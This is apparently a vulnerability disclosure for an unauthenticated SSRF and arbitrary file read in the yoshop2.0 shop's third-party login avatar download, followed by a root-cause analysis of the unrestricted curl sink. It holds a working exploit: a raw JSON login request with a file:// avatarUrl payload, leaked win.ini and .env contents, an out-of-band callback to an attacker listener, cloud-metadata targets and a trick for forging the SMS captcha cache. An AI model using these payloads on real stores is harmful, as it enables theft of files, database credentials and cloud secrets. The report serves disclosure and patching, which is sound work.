# yoshop2.0 SSRF / Arbitrary File Read Vulnerability Report

## Introduction to Vulnerabilities

The third-party login avatar download chain in yoshop2.0 (萤火商城 V2.0 open-source edition, ThinkPHP 6.1.5) passes the user-supplied avatar URL (`partyData[userInfo][avatarUrl]`) straight into `curl_init($url) + curl_exec()` without any protocol whitelist. An unauthenticated attacker can therefore make the server read any local file (`file:///etc/passwd`, `.env` with DB credentials) or hit any internal host / cloud metadata endpoint (`http://169.254.169.254/...`). The fetched bytes are persisted to `public/uploads/{storeId}/{date}/{md5}.png` and are downloadable over HTTP, giving full echo of the leaked content.

## Affected Versions

- yoshop2.0 open-source edition `<= 2.0` (ThinkPHP `6.1.5`, PHP `>= 7.4.0`, verified on the `yoshop2.0-master` snapshot)

## Utilize conditions

1. Login/registration (SMS captcha) must be reachable — default state; the attacker just uses a phone number he controls
2. `form[isParty]` must be a **real JSON boolean `true`** (strict `===` check, so the request must be `application/json`, not form-encoded)
3. No login session/token required

### Step 1 — Satisfy the SMS captcha

`Login::validate()` (Login.php:316-329) only checks the SMS code stored by `CaptchaApi::createSMS($phone)` under cache key `captchaSMS.{phone}`. In the lab (no SMS gateway) the code is injected into the file cache — `runtime/cache/{md5[0:2]}/{md5[2:]}.php` with content `"<?php\n//"+12位expire+"\n exit();?>\n"+serialize(['code'=>..,'times'=>5])` (File.php:182). A real attacker simply receives the code on his own phone.

### Step 2 — Trigger login with the malicious avatar URL (raw HTTP request)

```http
POST /index.php/api/passport/login HTTP/1.1
Host: 127.0.0.1:8001
Content-Type: application/json
platform: H5

{
    "form": {
        "mobile": "13977777777",
        "smsCode": "123456",
        "isParty": true,
        "partyData": {
            "oauth": "H5",
            "userInfo": {
                "avatarUrl": "file:///C:/Windows/win.ini"
            }
        }
    }
}
```

Raw HTTP response:

![image-20260826140805895](https://github.com/fangtang7/picx-images-hosting/raw/master/wookteam/image-20260826140805895.64eldaz3gn.webp)

```http
HTTP/1.1 200
X-Powered-By: PHP/7.4.33
Content-Type: application/json; charset=utf-8

{"message":"Trying to access array offset on value of type null","status":500,"data":{"isPrompt":true}}
```

Key fields: `form[mobile]`/`form[smsCode]` pass the captcha check; `form[isParty]` must be JSON `true` or `createUser()` skips the download branch; `form[partyData][userInfo][avatarUrl]` is the **sink**. The `status:500` is thrown *after* the download already happened — `createUserOauth()` at Party.php:56 (`$oauthInfo['oauth_id']` when `oauth=H5` makes `getOauthInfo()` return null) runs after `register() → createUser()` executed the curl, so the 500 actually confirms the SSRF fired.

### Step 3 — Verify the leaked content

After the request the downloaded bytes exist on disk:

```
runtime/image/10001/avatar_c9ef43a6f9bcf110300e40cc9e1bd68c.png   (92 bytes)
public/uploads/10001/20260826/<random>.png                        (92 bytes)
```

`GET /uploads/10001/20260826/<random>.png` returns the exact content of `C:\Windows\win.ini`:

```http
HTTP/1.1 200
Content-Type: image/png

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

In the lab `file:///D:/code/825/yoshop2.0-master/.env` was fully exfiltrated too (`DATABASE / PASSWORD = 123456`), and `http://127.0.0.1:8000/` (internal WookTeam, 1422 bytes HTML) proved the `http://` SSRF direction.

### Step 4 — Out-of-band proof: SSRF to an attacker-controlled server

The attacker does **not** need any login session or DB access to prove and exploit the bug. He stands up a plain HTTP listener (his VPS) and points `avatarUrl` at it — the server-side cURL then calls him back:

```
[0] attacker VPS listening on http://127.0.0.1:9999/ssrf-test
[x] removed stale avatar cache: avatar_47fb96f2...png
[1] sms cache injected -> runtime/cache/21/8519d790...php
[2] triggering login with avatarUrl = http://127.0.0.1:9999/ssrf-test
[2] login HTTP 200: {"message":"Trying to access array offset on value of type null","status":500,...}

[+] SUCCESS: attacker VPS received a request from yoshop server!
    GET /ssrf-test
    --- full request headers (proves it's server-side cURL) ---
    Host: 127.0.0.1:9999
    Accept: */*
```

`Host: 127.0.0.1:9999` + `Accept: */*` are the exact fingerprint of PHP cURL. Pointing at `127.0.0.1:9999` (a port that is not part of yoshop) simultaneously proves **server-side outbound requests to arbitrary internal IP:port** — an internal network scanner. Replacing the URL with `http://169.254.169.254/latest/meta-data/...` (cloud) or `http://<intranet-host>/` yields the same call-back, and for `file://` payloads the bytes land under `public/uploads` where they are fetched back (Steps 1-3).

![image-20260826143636549](https://github.com/fangtang7/picx-images-hosting/raw/master/wookteam/image-20260826143636549.60uzfl6db2.webp)

### Step 5 — Gotcha: each `avatarUrl` fires the SSRF only once

`Download::saveTempImage()` caches by URL:

```php
// app/common/library/Download.php:32-41
$savePath = $this->getSavePath($storeId, $prefix, $url);   // runtime/image/{storeId}/avatar_{md5(url)}.png  (Download.php:78-82)
if (!file_exists($savePath)) {
    $result = $this->curl($url);          // <-- skipped on second run of the same URL
    ...
}
```

`Avatar::download()` calls it with prefix `'avatar'` (Avatar.php:107). So the **same `avatarUrl` triggers the SSRF only once** — after the first successful run the file `runtime/image/10001/avatar_{md5(url)}.png` exists and cURL is never executed again for that exact URL. To re-trigger, either delete `runtime/image/10001/avatar_*.png` or change the URL (different md5). Lab-confirmed: `http://127.0.0.1:9999/ssrf-test` (md5 `55d35397...`) fired only on the first attempt; re-running with the identical URL did nothing until the cache file was removed or the URL changed.

## Root Cause Analysis

### 1. Sink — no protocol whitelist in the downloader

`app/common/library/Download.php:60-69`:

```php
private function curl(string $url)
{
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
```

`curl_init($url)` accepts every scheme cURL supports (`file://`, `http://`, ...); there is no `CURLOPT_PROTOCOLS` restriction. `saveTempImage()` (Download.php:32-41) writes whatever cURL returned to `runtime/image/{storeId}/avatar_{md5(url)}.png` with no content validation.

### 2. Entry — user-controlled avatar URL on an unauthenticated login

- `app/api/controller/Passport.php:39-52` — `login()` is open (only SMS captcha).

- `app/api/service/passport/Login.php:232-260` — `createUser()`:

  ```php
  if ($isParty === true && !empty($partyData)) {          // line 243 — strict ===
      $partyUserInfo = PartyService::partyUserInfo($partyData, true);
      $data = \array_merge($data, $partyUserInfo);
  }
  ```

- `app/api/service/passport/Party.php:95-117` — `partyUserInfo()`:

  ```php
  if (empty($data['avatar_id']) && !empty($partyUserInfo['avatarUrl'])) {   // line 112
      $data['avatar_id'] = static::partyAvatar($partyUserInfo['avatarUrl']); // line 113
  }
  ```

- `app/api/service/user/Avatar.php:53-61` — `party()` → `download()` (104-108) → `Download::saveTempImage()` → `upload()` (69-84, persists to `public/uploads`) → `record()` (91-96, row in `yoshop_upload_file`).
